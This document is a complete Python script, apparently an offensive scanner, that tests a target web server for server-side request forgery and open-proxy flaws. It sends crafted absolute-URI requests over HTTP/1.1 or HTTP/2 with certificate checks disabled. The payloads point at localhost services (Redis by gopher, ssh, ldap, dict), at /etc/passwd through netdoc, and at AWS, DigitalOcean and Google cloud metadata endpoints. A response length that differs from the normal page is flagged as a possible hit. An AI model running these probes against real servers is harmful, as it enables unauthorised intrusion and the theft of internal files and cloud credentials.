#!/usr/bin/env python3
import http.client
import socket
import ssl
import sys
import re
from urllib.parse import urlparse

baseline_length = None


# Colors
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RESET = "\033[0m"


HIDE_HEADERS = [
    "date",
    "Date",
    "connection",
    "vary",
    "set-cookie",
    "x-frame-options",
    "strict-transport-security",
    "access-control-allow-origin",
    "access-control-allow-credentials",
    "cross-origin-resource-policy",
    "x-xss-protection",
    "origin",
    "expires",
    "pragma",
    "etag",
    "content-security-policy",
    "x-content-type-options",
    "cache-control",
    "alt-svc",
    "accept-ranges",
    "last-modified",
    "x-cache",
    "referrer-policy",
    "permissions-policy"
]


def decode_chunked(body: str) -> str:
    """Decode a chunked transfer-encoding body."""
    decoded = b""
    i = 0
    while i < len(body):
        # Find next CRLF (chunk size line)
        crlf = body.find("\r\n", i)
        if crlf == -1:
            break
        chunk_size_hex = body[i:crlf]
        try:
            chunk_size = int(chunk_size_hex, 16)
        except ValueError:
            break
        if chunk_size == 0:
            break
        i = crlf + 2
        decoded += body[i:i+chunk_size].encode(errors="ignore")
        i += chunk_size + 2  # skip chunk + CRLF
    return decoded.decode(errors="ignore")


def get_baseline_length(url, max_redirects=5, timeout=10):
    """Fetch the site root, follow redirects, return content-length (or computed length)."""
    parsed = urlparse(url)
    scheme = parsed.scheme or "https"
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)

    conn_class = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
    conn = conn_class(host, port, timeout=timeout)
    path = parsed.path or "/"

    try:
        redirects = 0
        while True:
            conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0"})
            resp = conn.getresponse()

            # follow redirects
            if resp.status in (301, 302, 303, 307, 308) and redirects < max_redirects:
                location = resp.getheader("Location")
                if not location:
                    break
                # resolve relative location
                if "://" not in location:
                    # keep same scheme/host
                    if location.startswith("/"):
                        parsed = urlparse(f"{scheme}://{host}{location}")
                    else:
                        parsed = urlparse(f"{scheme}://{host}/{location}")
                else:
                    parsed = urlparse(location)
                scheme = parsed.scheme or scheme
                host = parsed.hostname or host
                path = parsed.path or "/"
                port = parsed.port or (443 if scheme == "https" else 80)
                conn.close()
                conn_class = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
                conn = conn_class(host, port, timeout=timeout)
                redirects += 1
                continue

            # got final response
            te = resp.getheader("Transfer-Encoding", "")
            if te.lower() == "chunked":
                # read raw and decode chunked using your decode_chunked()
                raw = resp.read().decode(errors="ignore")
                decoded = decode_chunked(raw)
                return len(decoded.encode("utf-8", errors="ignore"))

            cl = resp.getheader("Content-Length")
            if cl:
                try:
                    return int(cl)
                except Exception:
                    pass

            # fallback: read full body and return its length
            body = resp.read()
            return len(body)

    except Exception as e:
        short_err = str(e).split(":")[1]
        print(f"{RED}-------------------- [!] Failed fetch Default Content-Length: {short_err}{RESET}")
        return None
    finally:
        try:
            conn.close()
        except:
            pass


def filter_response(raw_response: str) -> str:
    headers, _, body = raw_response.partition("\r\n\r\n")

    status_line = headers.split("\r\n")[0]
    if "400 Bad Request" in status_line:
        match = re.search(r"<address>(.*?)</address>", body, re.IGNORECASE | re.DOTALL)
        if match:
            address_info = match.group(1).strip()
            return f"{RED}[!] 400 bad request{RESET}\n{RED}[!] {address_info}{RESET}\n"
        else:
            return f"{RED}[!] 400 bad request{RESET}\n"

    else:
        content_length = None

        if "transfer-encoding: chunked" in headers.lower():
            decoded_body = decode_chunked(body)

            filtered_headers = []
            for line in headers.split("\r\n"):
                if not line:
                    continue
                header_name = line.split(":", 1)[0].strip().lower()
                if header_name in HIDE_HEADERS or header_name == "transfer-encoding":
                    continue
                filtered_headers.append(line)

            content_length = len(decoded_body)
            filtered_headers.append(f"Content-Length: {content_length}")
            result = "\r\n".join(filtered_headers) + "\r\n\r\n"

        else:
            filtered_headers = []
            for line in headers.split("\r\n"):
                if not line:
                    continue
                header_name = line.split(":", 1)[0].strip().lower()
                if header_name in HIDE_HEADERS:
                    continue
                filtered_headers.append(line)

                if header_name == "content-length":
                    try:
                        content_length = int(line.split(":", 1)[1].strip())
                    except ValueError:
                        pass

            if content_length is None:
                content_length = len(body.encode(errors="ignore"))
                filtered_headers.append(f"Content-Length: {content_length}")

            result = "\r\n".join(filtered_headers) + "\r\n\r\n"

        if content_length is not None and baseline_length is not None:
            if content_length != baseline_length:
                print(f"{RED}-------------------- [!] Different Content-Length"
                      f"====> Got {content_length} (Expected {baseline_length}){RESET}")
            else:
                print(f"{YELLOW}-------------------- [+] Content-Length: Matches Default Page ({baseline_length}){RESET}")

        return result
    return headers + "\r\n\r\n"









from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded, StreamReset

def perform_http2_request_on_tls(tls_sock, raw_payload_bytes, timeout=8):
    """
    Send an HTTP/2 request over an already-wrapped TLS socket (tls_sock).
    raw_payload_bytes: the same payload bytes you build for HTTP/1.1 (absolute-URI form OK).
    Returns: (status_int, headers_dict, body_bytes, raw_response_text)
    raw_response_text is a textual representation similar to HTTP/1.x:
      "HTTP/2 <status>\r\nHeader: value\r\n...\r\n\r\n<body>"
    """
    # parse the payload text to extract method and absolute URI and headers
    payload_text = raw_payload_bytes.decode(errors="ignore")
    lines = payload_text.split("\r\n")
    if not lines:
        raise ValueError("Empty payload")

    # parse request-line (e.g. "GET http://127.0.0.1/path HTTP/1.1")
    first = lines[0].strip()
    try:
        method, uri, _ = first.split(" ")
    except ValueError:
        # fallback to method and path
        parts = first.split()
        if len(parts) >= 2:
            method = parts[0]
            uri = parts[1]
        else:
            method = "GET"
            uri = "/"

    parsed = urlparse(uri)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    scheme = parsed.scheme if parsed.scheme else "https"

    # build headers list for h2 (list of (name, value))
    # :authority prefers netloc; fallback to Host header if present
    authority = parsed.netloc
    req_headers = [
        (":method", method),
        (":scheme", scheme),
        (":path", path),
        (":authority", authority or ""),
    ]

    # parse remaining headers from payload and append (skip Connection)
    for line in lines[1:]:
        if not line:
            break
        if ":" not in line:
            continue
        k, v = line.split(":", 1)
        kn = k.strip()
        val = v.strip()
        if kn.lower() in ("connection", "proxy-connection"):
            continue
        if kn.lower() == "host":
            # host/value is represented by :authority in HTTP/2; skip
            continue
        # h2 wants header names lowercased (but h2 will handle it)
        req_headers.append((kn.lower(), val))

    # create h2 connection object and send client preface
    config = H2Configuration(client_side=True, header_encoding="utf-8")
    conn = H2Connection(config=config)
    conn.initiate_connection()
    tls_sock.sendall(conn.data_to_send())

    # start request on a new stream
    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, req_headers, end_stream=True)
    tls_sock.sendall(conn.data_to_send())

    # read frames until stream end (or timeout)
    response_headers = []
    response_body = bytearray()
    stream_ended = False
    tls_sock.settimeout(timeout)
    try:
        while not stream_ended:
            try:
                data = tls_sock.recv(65536)
            except socket.timeout:
                break
            if not data:
                break
            events = conn.receive_data(data)
            for ev in events:
                if isinstance(ev, ResponseReceived):
                    # ev.headers is list of (name, value)
                    response_headers = ev.headers
                elif isinstance(ev, DataReceived):
                    response_body += ev.data
                    # Acknowledge flow control so servers don't stall
                    conn.acknowledge_received_data(ev.flow_controlled_length, stream_id)
                elif isinstance(ev, StreamEnded):
                    stream_ended = True
                elif isinstance(ev, StreamReset):
                    raise RuntimeError(f"Stream reset by server: {ev.error_code}")
            # send any pending frames (e.g., WINDOW_UPDATE)
            out = conn.data_to_send()
            if out:
                tls_sock.sendall(out)
    finally:
        # don't close the TLS socket here — let caller decide (but it's fine if you do)
        pass

    # Build headers dict and status
    headers_dict = {}
    status = None
    for k, v in response_headers:
        if k == ":status":
            try:
                status = int(v)
            except Exception:
                status = None
        else:
            # combine duplicates into comma-separated values (simple)
            prev = headers_dict.get(k.lower())
            if prev:
                headers_dict[k.lower()] = prev + ", " + v
            else:
                headers_dict[k.lower()] = v

    # Build a raw_response_text similar to what filter_response expects:
    status_line = f"HTTP/2 {status}" if status is not None else "HTTP/2"
    header_lines = [status_line]
    for k, v in headers_dict.items():
        header_lines.append(f"{k}: {v}")
    raw_text = "\r\n".join(header_lines) + "\r\n\r\n" + response_body.decode(errors="ignore")

    return status, headers_dict, bytes(response_body), raw_text


def send_payload(host, port, scheme, payload):
    response_data = b""

    try:
        if scheme == "https":
            ctx = ssl._create_unverified_context()
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            s = socket.create_connection((host, port), timeout=8)  # <-- timeout
            tls = ctx.wrap_socket(s, server_hostname=host)

            proto = tls.selected_alpn_protocol()
            print(f"{YELLOW}-------------------- [+] Protocol Version: {proto}{RESET}")
            if proto == "h2":
                # perform full HTTP/2 request over the existing TLS socket
                try:
                    status, hdrs, body_bytes, raw_text = perform_http2_request_on_tls(tls, payload)
                    # pass raw_text to your existing filter_response (it expects "HTTP/1.x-like" text)
                    filtered = filter_response(raw_text)
                    tls.close()
                    return filtered
                except Exception as e:
                    print(f"{RED}-------------------- [!] HTTP/2 request failed: {e}{RESET}\n")
                    tls.close()
                    return ""

            tls.sendall(payload)
            while True:
                try:
                    data = tls.recv(4096)
                    if not data:
                        break
                    response_data += data     
                except (ConnectionResetError, socket.timeout, TimeoutError):
                    print(f"{RED}-------------------- [!] Connection dropped / Timed out{RESET}")
                    break
            tls.close()

        else: 
            s = socket.create_connection((host, port), timeout=8)  # <-- timeout
            s.sendall(payload)
            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        break
                    response_data += data     
                except (ConnectionResetError, socket.timeout, TimeoutError):
                    print(f"{RED}-------------------- [!] Connection dropped / Timed out{RESET}")
                    break  
            s.close()

    except (socket.timeout, TimeoutError):
        print(f"{RED}-------------------- [!] Connection Timed out{RESET}")
        return ""
    except Exception as e:
        print(f"{RED}-------------------- [!] Error: {e}{RESET}")
        return ""

    if not response_data:
        return ""
    return filter_response(response_data.decode(errors="ignore"))








# --------------------------- Main ---------------------------
if len(sys.argv) < 3 or sys.argv[1] != "-t":
    print(f"Usage: python {sys.argv[0]} -t https://target.com")
    sys.exit(1)

url = sys.argv[2]
parsed = urlparse(url)

scheme = parsed.scheme
host = parsed.hostname
port = parsed.port

if port is None:
    if scheme == "https":
        port = 443
    elif scheme == "http":
        port = 80
    else:
        print("[!] Unknown scheme, use http:// or https://")
        sys.exit(1)

print(f"{YELLOW}---------- [+] Target: {host}, Scheme: {scheme}, Port: {port}{RESET}")

baseline_length = get_baseline_length(url)
if baseline_length is not None:
    print(f"{YELLOW}-------------------- [*] Default Content-Length: {baseline_length}{RESET}\n")
else:
    print(f"{RED}-------------------- [!] Can't determine Default Content-length{RESET}\n")


payloads = [
    f"GET http://127.0.0.1 HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET http://127.0.0.1/admin HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET ssh://root@127.0.0.1:22 HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET gopher://127.0.0.1:6379/_PING HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET dict://127.0.0.1/ HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET php://127.0.0.1/ HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET tftp://127.0.0.1/ HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET jar:http://127.0.0.1!/ HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET netdoc:///etc/passwd HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET ldap://localhost:1337/%0astats%0aqui HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"CONNECT http://127.0.0.1 HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET http://192.168.1.2/ HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET http://169.254.169.254/metadata/v1/maintenance HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode(),
    f"GET http://metadata.google.internal/computeMetadata/v1/instance/id HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n".encode()
]

for payload in payloads:
    preview = payload.decode(errors="ignore").replace("\r", "").replace("\n", " ")
    print(f"{GREEN}---------- {preview[:35]}{RESET}")
    filtered = send_payload(host, port, scheme, payload)
    if filtered:
        print(f"{YELLOW}{filtered}{RESET}\n")
